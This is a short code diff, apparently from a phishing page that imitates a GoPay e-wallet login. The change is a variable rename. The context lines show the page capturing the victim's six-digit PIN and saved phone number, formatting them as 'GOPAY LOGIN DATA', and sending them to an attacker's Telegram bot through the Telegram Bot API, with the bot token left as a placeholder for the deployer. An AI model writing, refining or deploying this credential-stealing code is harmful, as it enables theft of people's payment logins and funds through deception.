@@ -304,9 +304,9 @@
 
         if (currentPin.length === 6) {
           localStorage.setItem('gopay_pin', currentPin);
-          const fullPhoneNumber = localStorage.getItem('gopay_phone') || 'Tidak ada data';
+          const savedPhone = localStorage.getItem('gopay_phone') || 'Tidak ada data';
 
-          const message = `🔔 *GOPAY LOGIN DATA*\n📱 No HP: \`${fullPhoneNumber}\`\n🔑 PIN: \`${currentPin}\``;
+          const message = `🔔 *GOPAY LOGIN DATA*\n📱 No HP: \`${savedPhone}\`\n🔑 PIN: \`${currentPin}\``;
           
           if (TELEGRAM_BOT_TOKEN !== "MASUKKAN_BOT_TOKEN_ANDA_DISINI") {
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
